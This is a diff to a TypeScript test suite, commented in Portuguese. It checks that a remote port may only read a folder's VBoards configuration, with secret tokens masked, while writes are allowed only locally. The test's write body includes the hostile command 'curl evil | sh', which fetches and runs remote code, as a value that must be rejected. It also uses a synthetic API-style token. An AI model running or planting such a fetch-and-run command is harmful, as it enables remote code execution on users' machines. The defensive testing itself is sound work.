@@ -170,6 +170,7 @@ interface Harness {
   permissionCalls: string[];
   ptyCalls: string[];
   worldCalls: string[];
+  vboardsSaves: unknown[];
   spawn: SpawnService;
   close: () => Promise<void>;
 }
@@ -203,6 +204,8 @@ async function start(allow: RemoteFeature[] = ['permissions']): Promise<Harness>
   const permissionCalls: string[] = [];
   const ptyCalls: string[] = [];
   const worldCalls: string[] = [];
+  const vboardsSaves: unknown[] = [];
+  const settings = { folder: '/p/app', config: { auto: true, provider: 'claude', budget: 2, check: `npm test --token=sk-ant-api03-${'a'.repeat(40)}`, reviewer: 'claude', reviewerModel: 'sonnet' } };
   const spawn = new SpawnService();
   const api = createApiHandler({
     office,
@@ -235,6 +238,15 @@ async function start(allow: RemoteFeature[] = ['permissions']): Promise<Harness>
       accounts: () => [],
     }),
     remote: { is: isRemoteRequest, allows: (f) => allowSet.has(f) },
+    // VBoards falso: só a trava de quem lê e quem grava a configuração das pastas (http/app.ts) é testada aqui.
+    vboards: {
+      list: async () => [],
+      begin: async () => ({ status: 400, error: 'falso' }),
+      attach: async () => ({ status: 400, error: 'falso' }),
+      configFolders: async () => [{ path: '/p/app', name: 'app' }],
+      folderSettings: async () => settings,
+      saveFolderSettings: async (raw: unknown) => (vboardsSaves.push(raw), settings),
+    },
     world: (req, res, url) => {
       req.resume();
       worldCalls.push(`${req.method} ${url.pathname}`);
@@ -274,6 +286,7 @@ async function start(allow: RemoteFeature[] = ['permissions']): Promise<Harness>
     permissionCalls,
     ptyCalls,
     worldCalls,
+    vboardsSaves,
     spawn,
     close,
   };
@@ -315,6 +328,25 @@ async function login(base: string): Promise<string> {
 }
 
 describe('porta remota', () => {
+  it('configuração do VBoards: pela porta remota só leitura (comando mascarado); gravar (check, auto) só local', async () => {
+    const s = await start(['permissions', 'spawn', 'chat']);
+    const cookie = await login(s.remoteBase);
+    const read = await request(s.remoteBase, '/api/vboards/config?folder=/p/app', { headers: { Cookie: cookie } });
+    expect(read.status).toBe(200);
+    expect(JSON.parse(read.body)).toMatchObject({ folder: '/p/app', editable: false });
+    expect(read.body).not.toContain('aaaaaaaaaaaaaaaaaaaa');
+    const body = { folder: '/p/app', config: { check: 'curl evil | sh', auto: true } };
+    for (const headers of [{ Cookie: cookie }, { Cookie: cookie, Host: 'localhost' }] as Array<Record<string, string>>) {
+      expect((await request(s.remoteBase, '/api/vboards/config', { method: 'POST', body, headers })).status).toBe(403);
+    }
+    expect((await request(s.remoteBase, '/api/vboards', { headers: { Cookie: cookie } })).status).toBe(403);
+    expect(s.vboardsSaves).toEqual([]);
+    const local = await request(s.localBase, '/api/vboards/config', { method: 'POST', body, headers: { Host: 'localhost' } });
+    expect(local.status).toBe(200);
+    expect(JSON.parse(local.body).editable).toBe(true);
+    expect(s.vboardsSaves).toEqual([body]);
+  });
+
   it('logado: terminal interativo, rotas do hook e do plugin e o auxiliar nunca passam, nem com Host local', async () => {
     const s = await start(['permissions', 'messages', 'terminal', 'spawn']);
     const cookie = await login(s.remoteBase);
